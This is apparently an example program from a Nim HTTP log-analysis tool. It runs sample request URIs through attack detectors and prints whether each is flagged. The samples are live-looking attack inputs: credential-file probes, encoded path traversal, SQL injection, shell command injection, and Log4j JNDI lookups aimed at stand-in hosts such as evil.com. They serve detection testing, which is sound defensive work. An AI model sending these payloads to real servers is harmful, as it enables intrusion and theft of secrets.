# Example: Attack Signature & Hostile Payload Detection
# Demonstrates Phase 04 / Category A: Sensitive file probes, CMS exploits,
# directory traversal, SQL injection, command injection (RCE), Log4j / JNDI,
# and OWASP Top 10 multi-vector payload analysis.
#
# Compile and run with:
#   nim r --path:src examples/attack_signatures_and_payloads.nim

import std/[strutils, options]
import http_logviewer/core/types
import http_logviewer/analyzer/signatures

proc main() =
  echo "=== http_logviewer: Attack Signature & Hostile Payload Detection (Phase 04 / Category A) ==="
  echo ""

  # 1. Sensitive File & Credential Probes (Item 01)
  echo "[1] Sensitive File & Configuration Probes (Item 01):"
  let sensitiveTestCases = [
    "/.env",
    "/.git/config",
    "/wp-config.php",
    "/id_rsa",
    "/docker-compose.yml",
    "/actuator/env",
    "/backup.sql",
    "/index.html" # Benign control
  ]
  for uri in sensitiveTestCases:
    let match = detectSensitiveFileProbe(uri)
    if match.isSome:
      echo "  [FLAGGED] ", uri.alignLeft(26), " -> Sensitive Probe: ", match.get()
    else:
      echo "  [CLEAN  ] ", uri.alignLeft(26), " -> Benign path"
  echo ""

  # 2. Content Management System (CMS) & Web Admin Exploits (Item 02)
  echo "[2] CMS & Web Admin Exploit Detection (Item 02):"
  let cmsTestCases = [
    "/wp-login.php",
    "/xmlrpc.php",
    "/phpmyadmin/index.php",
    "/admin/pma/",
    "/setup.php",
    "/solr/admin/",
    "/blog/recent-posts" # Benign control
  ]
  for uri in cmsTestCases:
    let match = detectCmsExploit(uri)
    if match.isSome:
      echo "  [FLAGGED] ", uri.alignLeft(26), " -> CMS Target: ", match.get()
    else:
      echo "  [CLEAN  ] ", uri.alignLeft(26), " -> Benign path"
  echo ""

  # 3. Directory Traversal & System Target Detection (Item 03)
  echo "[3] Directory Traversal Patterns & System Files (Item 03):"
  let traversalTestCases = [
    "/../../../etc/passwd",
    "..\\..\\windows\\win.ini",
    "/%2e%2e%2fetc/shadow",
    "/%252e%252e%252fboot.ini",
    "/images/logo.png" # Benign control
  ]
  for uri in traversalTestCases:
    let match = detectDirectoryTraversal(uri)
    if match.isSome:
      echo "  [FLAGGED] ", uri.alignLeft(26), " -> Traversal: ", match.get()
    else:
      echo "  [CLEAN  ] ", uri.alignLeft(26), " -> Benign path"
  echo ""

  # 4. SQL Injection (SQLi) Pattern Detection (Item 04)
  echo "[4] SQL Injection Pattern Detection (Item 04):"
  let sqliTestCases = [
    "/search?q=1+union+select+1,2,3",
    "/login?user=' or '1'='1",
    "/api?sort=id; waitfor delay '0:0:5'",
    "/query?cat=1 AND sleep(5)",
    "/search?query=nim+programming" # Benign control
  ]
  for uri in sqliTestCases:
    let match = detectSqlInjection(uri)
    if match.isSome:
      echo "  [FLAGGED] ", uri.alignLeft(38), " -> SQLi Pattern: ", match.get()
    else:
      echo "  [CLEAN  ] ", uri.alignLeft(38), " -> Benign query"
  echo ""

  # 5. Remote Code Execution (RCE) & Command Injection (Item 05)
  echo "[5] Remote Code Execution (RCE) & Shell Commands (Item 05):"
  let cmdTestCases = [
    "/cgi-bin/ping?host=127.0.0.1;id",
    "/lookup?domain=$(whoami)",
    "/upload?sh=/bin/sh",
    "/eval?code=base64_decode('payload')",
    "/info?topic=linux-kernels" # Benign control
  ]
  for uri in cmdTestCases:
    let match = detectCommandInjection(uri)
    if match.isSome:
      echo "  [FLAGGED] ", uri.alignLeft(38), " -> Command Injection: ", match.get()
    else:
      echo "  [CLEAN  ] ", uri.alignLeft(38), " -> Benign parameter"
  echo ""

  # 6. Log4j / JNDI Probe Detection (Item 06)
  echo "[6] Log4j / JNDI Probe & Evasion Detection (Item 06):"
  let jndiTestCases = [
    "/?token=${jndi:ldap://evil.com/x}",
    "/api/${jndi:rmi://10.0.0.1:1099/a}",
    "/?filter=${${lower:j}ndi:dns://dns.bad.org}",
    "/render?template=${username}" # Benign control
  ]
  for uri in jndiTestCases:
    let match = detectLog4jJndi(uri)
    if match.isSome:
      echo "  [FLAGGED] ", uri.alignLeft(44), " -> JNDI Injection: ", match.get()
    else:
      echo "  [CLEAN  ] ", uri.alignLeft(44), " -> Benign placeholder"
  echo ""

  # 7. OWASP Top 10 Composite Analysis (Item 07)
  echo "[7] OWASP Top 10 Composite Analysis & Threat Flags (Item 07):"
  let complexUri = "/wp-login.php?redirect=..%2f..%2f.env&query=' union select 1,2,3--&cmd=$(whoami)"
  echo "  Target URI: ", complexUri
  let (flags, matches) = analyzeAttackPayload(complexUri)
  echo "  Detected Flags: ", flags
  echo "  Signatures    : ", matches
  echo ""
  echo "=== Attack Signature Analysis Completed Successfully ==="

when isMainModule:
  main()
